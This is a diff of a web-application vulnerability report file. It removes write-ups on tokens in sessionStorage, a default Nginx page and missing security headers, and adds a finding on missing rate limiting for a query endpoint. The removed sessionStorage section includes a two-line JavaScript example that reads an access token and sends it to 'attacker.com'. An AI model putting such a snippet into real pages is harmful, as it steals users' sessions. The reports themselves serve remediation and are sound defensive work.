@@ -1,189 +1,47 @@
-Storing Access Tokens in sessionStorage
-📄 Description
-When an application stores access tokens (e.g., JWTs) in sessionStorage, the token is accessible via JavaScript. This exposes the application to client-side attacks such as:
+ulnerability Report: No Rate Limiting on Query Creation Endpoint
+🧾 Title
+No Rate Limiting on Query Creation – Allows Abuse via Automated Requests
 
-Cross-Site Scripting (XSS): If an attacker successfully injects malicious JavaScript into your app (via a vulnerable component, input field, or third-party script), they can read from sessionStorage and steal the access token
+🔍 Description
+After successful authentication, the application provides a "Queries" feature where users can create and submit queries. It was observed that this functionality does not implement any rate limiting, making it possible to send a high volume of automated requests using tools like Burp Suite Intruder without restriction.
 
- Impact
-Storing access tokens in localStorage or sessionStorage introduces significant risks if an attacker successfully executes a Cross-Site Scripting (XSS) attack on the application.
-
-🚨 How an Attacker Can Exploit This
-Inject Malicious JavaScript via XSS
-
-If the application has an XSS vulnerability (e.g., unsanitized input rendered as HTML), the attacker can inject malicious scripts.
-
-Extract Access Token
-
-The attacker’s script runs in the context of the victim's browser and can access localStorage or sessionStorage.
-
-Example:
-
-javascript
-Copy
-Edit
-const token = sessionStorage.getItem("access_token");
-fetch("https://attacker.com/steal?token=" + token);
-Session Hijacking
-
-The attacker uses the stolen token to authenticate as the user, gaining full access to their account and actions within the application.
-
-Privilege Escalation or Sensitive Data Exposure
-
-If the token belongs to an admin or privileged user, the attacker may:
-
-Access or delete sensitive data
-
-Modify configurations
-
-Perform financial transactions
-
-Compromise other users (via impersonation or downstream actions)
-
-Persistence (in case of localStorage)
-
-If stored in localStorage, the token persists across sessions, increasing the attack window.
-
-
-🛠️ Remediation
-✅ 1. Prevent XSS
-Use libraries like DOMPurify to sanitize user input.
-
-Apply a strong Content Security Policy (CSP) to prevent inline scripts.
-
-Escape output correctly in JSX and templates.
-
-Avoid dangerouslySetInnerHTML unless absolutely necessary.
-
-✅ 2. Consider Using HttpOnly Cookies Instead
-Store tokens in secure, HttpOnly cookies (with SameSite=Strict or Lax).
-
-HttpOnly cookies are not accessible to JavaScript, making them resistant to XSS.
-
-✅ 3. Token Scope and Expiry
-Issue short-lived access tokens.
-
-Use refresh tokens securely (preferably rotated and stored in HttpOnly cookies).
-
-✅ 4. Token Rotation
-Implement automatic access token renewal with refresh tokens on expiration.
-
-
-Displaying Default Nginx Web Server Page
-📄 Description
-When an application or server is misconfigured and displays the default Nginx landing page (e.g., “Welcome to nginx!”), it typically indicates one of the following:
-
-The web root directory is empty or not properly linked to the application.
-
-The Nginx configuration is incomplete, missing a reverse proxy or upstream block.
-
-The server is exposed publicly without a running application, making it easier for attackers to identify the server type and software version.
-
-This is a form of information disclosure and misconfiguration, commonly categorized under CWE-200: Exposure of Sensitive Information to an Unauthorized Actor.
+By exploiting this lack of control, an attacker can rapidly generate queries at scale, potentially bypassing intended usage limits, consuming excessive server resources, or using the application in a way that was not intended by its business logic.
 
 ⚠️ Impact
-🔓 1. Technology Fingerprinting
-Reveals that the backend is using Nginx, including possible version info.
+The lack of rate limiting can lead to several issues:
 
-Attackers can use this to craft targeted exploits for known vulnerabilities in that Nginx version.
+Denial of Service (DoS): Excessive queries can degrade server performance or cause unavailability for legitimate users.
 
-🧱 2. Entry Point Enumeration
-Suggests the application is misconfigured or incomplete, which may:
+Abuse of Functionality: Users may bypass restrictions such as query limits per account tier (e.g., free vs. premium).
 
-Reveal unused or abandoned infrastructure.
+Increased Attack Surface: An attacker can brute force or enumerate query-based inputs/data rapidly, increasing the risk of further exploitation.
 
-Lead attackers to directory traversal, open directory listings, or unprotected services.
+Billing or Infrastructure Impact: If backend resources (e.g., compute, DB queries) are linked to usage, this can result in financial loss or overage charges.
 
-🔁 3. Gateway Misrouting
-If the default page is returned instead of a proxy application (e.g., Node.js, PHP app, or React build), it indicates that routing or app deployment failed.
+🛠️ Recommendation
+Implement appropriate rate limiting and throttling controls on the query creation endpoint:
 
-This might allow attackers to send test payloads and probe the reverse proxy or backend directly.
+Rate Limiting
 
-🛠️ Remediation
-✅ 1. Deploy a Proper Default Application or Redirect
-Ensure the default root (/var/www/html or defined root in nginx.conf) is populated with your intended web application, not the default placeholder.
+Set thresholds (e.g., max 10 requests per minute per user/IP).
 
-✅ 2. Harden Nginx Configuration
-Remove or replace the default server block in /etc/nginx/sites-available/default.
+Use tools like API gateways, reverse proxies (e.g., NGINX, Cloudflare), or WAFs for enforcement.
 
-Disable or delete the default index.html:
+Throttling with Exponential Backoff
 
-bash
-Copy
-Edit
-sudo rm /usr/share/nginx/html/index.html
-✅ 3. Set Up a Custom 404 or Maintenance Page
-Prevent the Nginx default from ever being exposed, even when the app fails.
+Introduce delays when thresholds are exceeded to slow down abuse without full blocking.
 
-✅ 4. Restrict Unused Ports and Virtual Hosts
-Don’t leave Nginx listening on open ports with default behavior (e.g., 80 or 8080) unless intentionally exposed.
+Quota Management
 
-🧪 Bonus: Detection Tips
+Define business rules (e.g., free users can send X queries per day) and enforce them server-side.
 
+Monitoring & Alerting
 
-Missing Security Headers in HTTP Response
-📄 Description
-The HTTP response from the server is missing several critical security headers that help protect users from common web-based attacks such as Cross-Site Scripting (XSS), clickjacking, and content sniffing. These headers are not just best practices—they’re essential for reducing attack surface on the client side.
+Monitor query activity and flag unusual behavior (e.g., rapid query bursts).
 
+Log requests with user IDs and IP addresses for auditing.
 
-Impact
-Without these headers:
-XSS Attacks are more likely:
+User Feedback
 
-No Content-Security-Policy means the browser does not restrict scripts to trusted sources.
+Return appropriate HTTP status codes (e.g., 429 Too Many Requests) when limits are exceeded.
 
-Clickjacking Risk:
-
-No X-Frame-Options allows the page to be embedded in iframes, enabling clickjacking attacks.
-
-MIME-type Sniffing:
-
-Without X-Content-Type-Options: nosniff, the browser might interpret files as a different type, allowing malicious files to be executed.
-
-Information Leakage:
-
-Missing Referrer-Policy can expose sensitive URLs to third parties when users navigate away.
-
-Lack of Transport Security Enforcement:
-
-No Strict-Transport-Security (HSTS) means attackers can attempt SSL stripping attacks.
-
-Excessive Browser Access to Features:
-
-No Permissions-Policy allows full access to camera, microphone, geolocation, etc., by default.
-
- Recommendations
-Add the following headers to your Nginx or Apache configuration or via application-level middleware (e.g., Express.js, Django, Spring):
-
-http
-Copy
-Edit
-# Prevent XSS and limit scripts
-Content-Security-Policy: default-src 'self';
-
-# Prevent clickjacking
-X-Frame-Options: DENY
-
-# Prevent MIME-type sniffing
-X-Content-Type-Options: nosniff
-
-# Enforce HTTPS
-Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
-
-# Protect referral info
-Referrer-Policy: no-referrer
-
-# Restrict browser features
-Permissions-Policy: camera=(), microphone=(), geolocation=()
-📌 Bonus: Nginx Configuration Example
-nginx
-Copy
-Edit
-add_header Content-Security-Policy "default-src 'self';";
-add_header X-Frame-Options "DENY";
-add_header X-Content-Type-Options "nosniff";
-add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
-add_header Referrer-Policy "no-referrer";
-add_header Permissions-Policy "camera=(), microphone=(), geolocation=()";
-
-
- 
